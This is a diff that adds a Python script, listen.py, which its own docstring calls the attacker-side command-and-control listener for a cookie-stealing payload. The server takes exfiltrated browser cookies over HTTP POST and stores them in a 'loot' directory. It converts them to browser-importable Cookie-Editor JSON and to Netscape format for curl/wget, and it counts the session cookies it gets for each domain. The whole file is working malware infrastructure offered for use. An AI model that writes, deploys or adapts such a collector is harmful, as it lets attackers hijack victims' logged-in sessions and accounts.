@@ -1,0 +1,135 @@
+#!/usr/bin/env python3
+"""listen.py — HTTP server that receives cookies exfiltrated by the payload.
+Run on the attacker side:  python listen.py [port]
+
+The payload (when infected with the C2 URL) makes an HTTP POST with JSON in the
+Cookie-Editor format (directly importable in the browser via the Cookie-Editor extension).
+
+Output:
+  cookies_recv.json  — cumulative collection (dedup)
+  cookies_recv.txt   — Netscape format (importable in curl/wget)
+  stdout             — per-domain summary
+"""
+import json, os, sys, time, socket
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+HERE   = os.path.dirname(os.path.abspath(__file__))
+LOOT   = os.path.join(HERE, "loot")
+os.makedirs(LOOT, exist_ok=True)
+JSONF  = os.path.join(LOOT, "cookies.json")
+TXTF   = os.path.join(LOOT, "cookies.txt")
+PORT   = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
+
+
+class HTTPServerV4(HTTPServer):
+    """Force IPv4 — HTTPServer default may resolve 0.0.0.0 to IPv6 on Windows."""
+    address_family = socket.AF_INET
+
+
+def load_existing():
+    if os.path.exists(JSONF):
+        try:
+            with open(JSONF, encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return []
+
+
+def merge(old, new):
+    seen, out = {}, list(old)
+    for i, c in enumerate(out):
+        k = (c.get("domain"), c.get("name"), c.get("path"))
+        seen[k] = i
+    for c in new:
+        k = (c.get("domain"), c.get("name"), c.get("path"))
+        if k in seen:
+            out[seen[k]] = c
+        else:
+            seen[k] = len(out)
+            out.append(c)
+    return out
+
+
+def write_json(rows):
+    with open(JSONF, "w", encoding="utf-8") as f:
+        json.dump(rows, f, ensure_ascii=False, indent=1)
+
+
+def write_txt(rows):
+    lines = ["# Netscape HTTP Cookie File"]
+    for c in rows:
+        d = c.get("domain", "")
+        if not d.startswith("."):
+            d = "." + d
+        exp = int(c.get("expirationDate") or 0)
+        lines.append("\t".join([
+            d, "TRUE", c.get("path") or "/",
+            "TRUE" if c.get("secure") else "FALSE",
+            str(exp), c.get("name", ""), c.get("value") or ""
+        ]))
+    with open(TXTF, "w", encoding="utf-8") as f:
+        f.write("\n".join(lines) + "\n")
+
+
+class Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(length) if length > 0 else b"[]"
+        try:
+            cookies = json.loads(body.decode("utf-8", "replace"))
+        except Exception as ex:
+            self.send_response(400)
+            self.end_headers()
+            self.wfile.write(b"bad json")
+            print("[-] invalid JSON (%d bytes): %s" % (length, ex))
+            return
+
+        if not isinstance(cookies, list):
+            cookies = [cookies]
+
+        # merge with existing collection
+        old = load_existing()
+        alls = merge(old, cookies)
+        write_json(alls)
+        write_txt(alls)
+
+        # summary
+        top = {}
+        session = 0
+        for c in cookies:
+            d = c.get("domain", "?")
+            top[d] = top.get(d, 0) + 1
+            if not int(c.get("expirationDate") or 0):
+                session += 1
+
+        print("\n[+] %d cookies received (%d session) | total: %d" % (
+            len(cookies), session, len(alls)))
+        print("    -> %s (%d bytes)" % (JSONF, os.path.getsize(JSONF)))
+        print("    -> %s (%d bytes)" % (TXTF, os.path.getsize(TXTF)))
+        for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:15]:
+            print("      %5d  %s" % (n, d))
+
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.end_headers()
+        self.wfile.write(b"ok")
+
+    def log_message(self, fmt, *args):
+        pass  # silent (we use our own prints above)
+
+
+def main():
+    print("[listen] exfiltration server on port %d (Ctrl+C to stop)" % PORT)
+    print("[listen] output: %s + %s" % (JSONF, TXTF))
+    print("[listen] format: Cookie-Editor JSON (browser-importable)")
+    server = HTTPServerV4(("0.0.0.0", PORT), Handler)
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("\n[listen] stopped")
+        server.server_close()
+
+
+if __name__ == "__main__":
+    main()
